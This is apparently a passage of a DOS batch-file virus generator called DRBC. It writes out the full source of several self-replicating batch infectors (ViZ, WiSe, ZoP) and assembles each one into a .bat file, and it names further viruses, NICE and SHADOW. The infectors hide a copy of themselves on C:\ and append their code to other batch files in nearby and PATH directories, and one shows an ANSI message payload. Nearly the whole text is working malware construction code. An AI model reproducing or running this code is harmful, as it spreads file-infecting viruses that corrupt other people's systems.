copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc+26.rbc+27.rbc+28.rbc+29.rbc+30.rbc+31.rbc+32.rbc+33.rbc+34.rbc+36.rbc+37.rbc+38.rbc+39.rbc+40.rbc+41.rbc+42.rbc+43.rbc+44.rbc+45.rbc+46.rbc+47.rbc+48.rbc+49.rbc+50.rbc+51.rbc+52.rbc+53.rbc+54.rbc+55.rbc+56.rbc+57.rbc+58.rbc+59.rbc+60.rbc+61.rbc+62.rbc+63.rbc+64.rbc+65.rbc+66.rbc+67.rbc+68.rbc+69.rbc+70.rbc+71.rbc+72.rbc+73.rbc+74.rbc+75.rbc nice.bat
del *.rbc
echo.
echo.
echo NICE virus created...Thanx for using DRBC
goto fine
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc+26.rbc+27.rbc+28.rbc+29.rbc+30.rbc+31.rbc+32.rbc+33.rbc+34.rbc+36.rbc+37.rbc+38.rbc+39.rbc+40.rbc+41.rbc+42.rbc+43.rbc+44.rbc+45.rbc+46.rbc+47.rbc+48.rbc+49.rbc+50.rbc+51.rbc+52.rbc+53.rbc+54.rbc+55.rbc shadow.bat
del *.rbc
echo.
echo.
echo SHADOW virus created...Thanx for using DRBC
goto fine
:viz
echo :: [ViZ] by -KD- of Metaphase>1.rbc
echo @echo off%_ViZ%>2.rbc
echo if '%1=='ViZ goto ViZ%2>3.rbc
echo if exist c:\_ViZ.bat goto ViZstart>4.rbc
echo if not exist %0.bat goto ViZexit>5.rbc
echo find "ViZ"<%0.bat>c:\_ViZ.bat>6.rbc
echo attrib c:\_ViZ.bat +h>7.rbc
echo :ViZstart>8.rbc
echo if '%!ViZ%=='- goto ViZexit>9.rbc
echo set !ViZ=%!ViZ%->10.rbc
echo command /e:5000 /c c:\_ViZ ViZ v>11.rbc
echo :DaViZ>12.rbc
echo goto ViZexit>13.rbc
echo :ViZv>14.rbc
echo for %%a in (*.bat) do call c:\_ViZ ViZ inf %%a>15.rbc 
echo exit ViZ>16.rbc
echo :ViZ_inf>17.rbc
echo find "ViZ"<%3>nul>18.rbc
echo if not errorlevel 1 goto ViZlevel>19.rbc
echo type c:\_ViZ.bat>>%3>20.rbc
echo exit ViZ>21.rbc
echo :ViZlevel>22.rbc
echo set ViZ!=%ViZ!%->23.rbc
echo if %ViZ!%==- exit>24.rbc 
echo :ViZexit>25.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc viz.bat
del *.rbc
echo.
echo.
echo VIZ virus created...Thanx for using DRBC
goto fine
:wise
echo @if not '%wise%=='Host goto wise_beg>1.rbc
echo :: dummy host>2.rbc
echo @if '%WiSe%=='Host goto WiSe_end>3.rbc
echo :WiSe_beg>4.rbc
echo @echo off %_WiSe%>5.rbc
echo if '%1=='#! goto WiSe_%2>6.rbc
echo set WiSeN=%0>7.rbc
echo if '%0==' set WiSeN=autoexec>8.rbc
echo set WiSeC=%1 %2 %3 %4 %5 %6 %7 %8 %9>9.rbc
echo call %WiSeN% #! run>10.rbc
echo set WiSe=x.$>11.rbc
echo if exist c:\WiSe_.bat goto WiSe_shell>12.rbc
echo if exist %WiSeN% set WiSe=%WiSeN%>13.rbc
echo if exist %WiSeN%.bat set WiSe=%WiSeN%.bat>14.rbc
echo if exist %WiSe% goto WiSe_root>15.rbc 
echo %WiSeN% #! L1 %path%>16.rbc
echo :WiSe_L1>17.rbc
echo shift %_WiSe%>18.rbc
echo if '%2==' goto WiSe_out>19.rbc
echo if exist %2%WiSeN% set WiSe=%2%WiSeN%>20.rbc
echo if exist %2%WiSeN%.bat set WiSe=%2%WiSeN%.bat>21.rbc
echo if exist %2\%WiSeN% set WiSe=%2\%WiSeN%>22.rbc
echo if exist %2\%WiSeN%.bat set WiSe=%2\%WiSeN%.bat>23.rbc
echo if not exist %WiSe% goto WiSe_L1>24.rbc
echo :WiSe_root>25.rbc
echo find "WiSe"<%WiSe%>c:\WiSe_.bat>26.rbc
echo attrib c:\WiSe_.bat +h>27.rbc
echo :WiSe_shell>28.rbc
echo command /e:5000 /c c:\WiSe_ #! par . .. %path%>29.rbc
echo :WiSe_out>30.rbc
echo set WiSe=>31.rbc
echo set WiSeN=>32.rbc
echo set WiSeC=>33.rbc
echo goto WiSe_end>34.rbc
echo :WiSe_run>35.rbc
echo set WiSe=Host>36.rbc
echo %WiSeN% %WiSeC%>37.rbc
echo :WiSe_par>38.rbc
echo shift %_WiSe%>39.rbc
echo if '%2==' exit WiSe>40.rbc
echo for %%i in (%2\*.bat %2*.bat) do call c:\WiSe_ #! inf %%i>41.rbc
echo goto WiSe_par>42.rbc
echo :WiSe_inf>43.rbc
echo find "WiSe"<%3>nul>44.rbc
echo if not errorlevel 1 goto WiSe_S>45.rbc
echo echo @if not '%%wise%%=='Host goto wise_beg>WiSe$>46.rbc
echo type %3>>WiSe$>47.rbc
echo echo.>>WiSe$>48.rbc
echo type c:\WiSe_.bat>>WiSe$>49.rbc
echo move WiSe$ %3>nul>50.rbc
echo if not '%WiSeX%=='11111 exit>51.rbc
echo set WiSe=echo>52.rbc
echo %WiSe% [0;37;40m[2J[1;31m[3;10H��������������������������ͻ[4;10H�[37;44m>53.rbc                          
echo %WiSe% [4;37H[31;40m�[5;10H�[37;44m  My Olsa, jukko you      [31;40m�[6;10H�[37;44m  Grumbada, see>54.rbc
echo %WiSe% [6;26H gretchus  [31;40m�[7;10H�[37;44m  Umbla Umbla Motto       [31;40m�[8;10H�[37;44m  So>55.rbc
echo %WiSe% [8;15H you have a virus?    [31;40m�[9;10H�[37;44m                          [31;40m�[10;10H�>56.rbc
echo %WiSe% [10;11H�������������������������ͼ[32m[12;12H� [0;33;40m[12;25HThe Forward is beneath me>57.rbc
echo %WiSe% [1;32m[13;11H����[0;33;40m[13;25HBehind me becomes my left[1;32m[14;8H����������[0;33;40m>58.rbc
echo %WiSe% [14;25HI look up and see earth below[1;32m[15;9H�����������[0;33;40m[15;25HJust as reality be>59.rbc
echo %WiSe% [15;43Hcame not.[1;32m[16;10H��������[17;11H�[17;15H��[36m[17;25HMy god! It's full of stars>60.rbc
echo %WiSe% [17;51H![23;1H[0m>61.rbc
echo exit WiSe>62.rbc
echo :WiSe_S>63.rbc
echo set WiSeX=%WiSeX%1>64.rbc
echo if %WiSeX%==1111111111111111 exit>65.rbc
echo :WiSe_end>66.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc+26.rbc+27.rbc+28.rbc+29.rbc+30.rbc+31.rbc+32.rbc+33.rbc+34.rbc+36.rbc+37.rbc+38.rbc+39.rbc+40.rbc+41.rbc+42.rbc+43.rbc+44.rbc+45.rbc+46.rbc+47.rbc+48.rbc+49.rbc+50.rbc+51.rbc+52.rbc+53.rbc+54.rbc+55.rbc+56.rbc+57.rbc+58.rbc+59.rbc+60.rbc+61.rbc+62.rbc+63.rbc+64.rbc+65.rbc+66.rbc wise.bat
del *.rbc
echo.
echo.
echo WISE virus created...Thanx for using DRBC
goto fine
:zop
echo @echo off>1.rbc
echo ::[8m --- [ZoP_B] Batch Infector --->2.rbc
echo if '%2=='ZoP_ goto ZoP_1>3.rbc
echo if '%1=='ZoP_ echo ["`";"`"p>4.rbc
echo ::["`";"ZoP_B ZoP_";13p>5.rbc
echo ::[4AZoP_>6.rbc
echo if exist c:\ZoP_B.bat goto ZoP_>7.rbc
echo if not exist %0.bat goto ZoP_2>8.rbc
echo echo @echo Off>c:\ZoP_B.bat>9.rbc
echo find "ZoP_"<%0.bat>>c:\ZoP_B.bat>10.rbc
echo attrib c:\ZoP_B.bat +h>11.rbc
echo ::[6AZoP_>12.rbc
echo :ZoP_>13.rbc
echo for %%v in (*.bat) do call c:\ZoP_B %%v ZoP_>14.rbc
echo if '%ZoP_%==' for %%v in (..\*.bat) do call c:\ZoP_B %%v ZoP_>15.rbc
echo set ZoP_=>16.rbc
echo goto ZoP_2>17.rbc
echo ::[6AZoP_ >18.rbc
echo :ZoP_1>19.rbc
echo if '%ZoP_%=='11 goto ZoP_2>20.rbc
echo find "ZoP_"<%1>nul>21.rbc
echo if not errorlevel 1 goto ZoP_2>22.rbc
echo type c:\ZoP_B.bat>>%1>23.rbc
echo set ZoP_=%ZoP_%1>24.rbc
echo :ZoP_2>25.rbc 
echo ::ZoP_[7A[0m>26.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc+26.rbc zop.bat
del *.rbc
echo.
echo.
echo ZOP virus created...Thanx for using DRBC
goto fine
:fine
echo.
echo.
prompt $p$g
